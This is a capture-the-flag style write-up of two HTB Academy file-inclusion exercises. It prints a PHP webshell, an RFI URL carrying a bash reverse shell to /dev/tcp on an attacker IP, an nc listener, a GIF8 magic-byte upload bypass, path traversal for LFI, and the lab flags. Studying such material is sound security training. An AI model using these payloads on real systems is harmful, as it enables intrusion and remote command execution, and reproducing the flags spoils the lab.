---
layout: writeup
title: "HTB Academy - File Inclusions Techniques"
date: 2026-03-26
published: false

platform: HTB Academy
difficulty: Academy
os: Linux
status: Retired

stuck_summary: "The GIF8 header shows up in every command output from the webshell — it's not an error, it's coming from your upload. Ignore it or strip it mentally"

tags:
  - linux
  - lfi
  - rfi
  - file-upload
  - php-webshell
  - path-traversal
  - url-encoding
  - gif-magic-bytes
  - python-server
  - htb-academy
---

## Overview

These are a few of the interactive technique exercises from the HTB Academy File Inclusions module — not the final skills assessment. Two exercises are covered here: Remote File Inclusion (RFI) and LFI combined with File Upload. These build the foundational techniques used in the skills assessment.

---

## Exercise 1 — Remote File Inclusion (RFI)

**Concept:** The server fetches and executes a file from a remote URL you control. If the application passes user input directly to a file inclusion function without restriction, you can point it at your own server and serve a malicious PHP file.

### Steps

**Step 1 — Create the webshell**

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

> Single quotes are mandatory here. Double quotes cause bash to interpret `$_REQUEST` as a variable and strip it before writing the file. Your PHP breaks silently.

**Step 2 — Serve it over HTTP**

```bash
python3 -m http.server 8080
```

Run this from the directory containing `shell.php`. Python spins up a web server on port 8080 that the target will fetch your shell from.

**Step 3 — Trigger the RFI**

In the URL, swap the language parameter to point at your server:

```
http://TARGET/index.php?language=http://YOUR_IP:8080/shell.php&cmd=id
```

If the server fetches and executes your file, you'll see the output of `id` in the response. RFI confirmed.

> Watch your Python server terminal — you'll see the GET request come in from the target when it fetches your shell. If nothing appears, the server isn't reaching you (firewall, wrong IP, or RFI disabled).

**Step 4 — Get a reverse shell**

Start your listener:

```bash
nc -lvnp 4444
```

Then trigger the reverse shell via the RFI parameter:

```
http://TARGET/index.php?language=http://YOUR_IP:8080/shell.php&cmd=/bin/bash+-e+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'
```

Shell caught. Now find the flag:

```bash
find / -name flag.txt 2>/dev/null
cat /path/to/flag.txt
```

> `2>/dev/null` suppresses permission denied errors from directories you can't read — keeps the output clean.

### Flags

<details>
<summary>🚩 Flag — click to reveal</summary>

99a8fc05f033f2fc0cf9a6f9826f83f4

</details>

---

## Exercise 2 — LFI + File Upload (GIF Magic Bytes)

**Concept:** The upload form only accepts images. You bypass this by prepending the GIF magic bytes (`GIF8`) to a PHP webshell — the server thinks it's an image, stores it, and the LFI vulnerability executes it as PHP.

**Why GIF8 works:** Many upload filters check the file's magic bytes (the first few bytes of the file) rather than the extension. `GIF8` is the magic byte signature for GIF images. Prepending it fools the filter into accepting the file as a valid image while the PHP payload executes normally.

### Steps

**Step 1 — Create the GIF webshell**

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

The `GIF8` at the start satisfies the image filter. Everything after it is your PHP webshell.

**Step 2 — Upload via the profile image upload form**

Upload `shell.gif` through the site's upload functionality. It will be accepted as a valid GIF.

**Step 3 — Find where it was stored**

Inspect the page source after uploading — look for your filename in an `<img>` tag or similar. The upload path was:

```
./profile_images/shell.gif
```

**Step 4 — Identify the LFI parameter**

Switching the language from English to Spanish revealed no directory prefix was being added — the inclusion was clean. Since the app is likely running from a subdirectory, traverse up to reach the uploads folder:

```
http://TARGET/index.php?language=../../../../profile_images/shell.gif&cmd=id
```

If you see output (plus `GIF8` at the top — more on this below), RCE is confirmed.

**Step 5 — Find the flag without a reverse shell**

List the root directory using URL-encoded spaces (`%20` = space):

```
&cmd=ls%20/
```

This reveals the flag filename. Then read it:

```
&cmd=cat%20/flagfilename.txt
```

> The flag filename was long and non-obvious — don't assume `flag.txt`. Always `ls /` first to see the exact name.

### The GIF8 problem

Every command output will have `GIF8` prepended to it:

```
GIF8
www-data
```

This is not an error. It's coming from your uploaded shell.gif — the magic bytes are being output along with your command result. Mentally ignore it or strip it when copying output. It does not affect execution.

### Flags

<details>
<summary>🚩 Flag — click to reveal</summary>

HTB{upl04d+lf!+3x3cut3=rc3}

</details>

---

## Key Takeaways

- **RFI needs outbound connectivity** — the target server must be able to reach your machine. If your Python server gets no requests, check your IP and firewall rules on the HTB VPN interface.
- **Single quotes in echo** — always when writing PHP via bash. Double quotes break variable names silently.
- **GIF8 magic bytes** — prepend to any PHP webshell to bypass image-only upload filters. The bytes appear in output but don't affect execution.
- **URL encoding** — spaces become `%20`, `&` becomes `%26`. Any special character in a URL parameter needs encoding or the request breaks.
- **Path traversal depth** — if you're not sure how deep the app is, try `../../../../` first. Extra `../` on a path that's already at root is harmless.
- **`2>/dev/null`** — always append to `find` commands to suppress noise from permission-denied directories.
- **`ls /` before `cat`** — never assume the flag filename. Always list first, then read.
